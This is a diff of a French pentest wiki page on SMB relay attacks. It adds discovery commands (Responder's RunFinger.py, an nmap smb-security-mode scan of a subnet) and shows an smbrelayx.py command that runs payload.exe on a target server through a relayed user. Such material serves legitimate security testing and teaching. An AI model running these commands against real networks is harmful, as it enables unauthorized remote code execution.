@@ -13,6 +13,18 @@ Pour pouvoir faire un SMB relay il faut avoir une requête à relayer. De nombre
 
 ## Outils
 
+### Découverte
+
+Il est possible d'identifier les serveurs vulnérables avec un des scripts suivants:
+
+``` bash
+/usr/share/responder/tools/RunFinger.py -i $target
+nmap --script smb-security-mode.nse -Pn -p445 X.X.X.X/24 -oA nmap_smb_security_mode_full
+```
+
+
+### Exploitation
+
 [Impacket](/Impacket "wikilink") propose un outil **smbrelayx.py**:
 
 Une utilisation simple est la suivante:
@@ -22,6 +34,8 @@ smbrelayx.py -e payload.exe -h 10.33.1.1
 ```
 
 Ceci executera le fichier payload.exe sur le serveur 10.33.1.1 si l'utilisateur qu'on relaie a les droits nécessaires.
+
+[Responder](/Responder "wikilink") contient également différents outils.
 
 ## Références
 
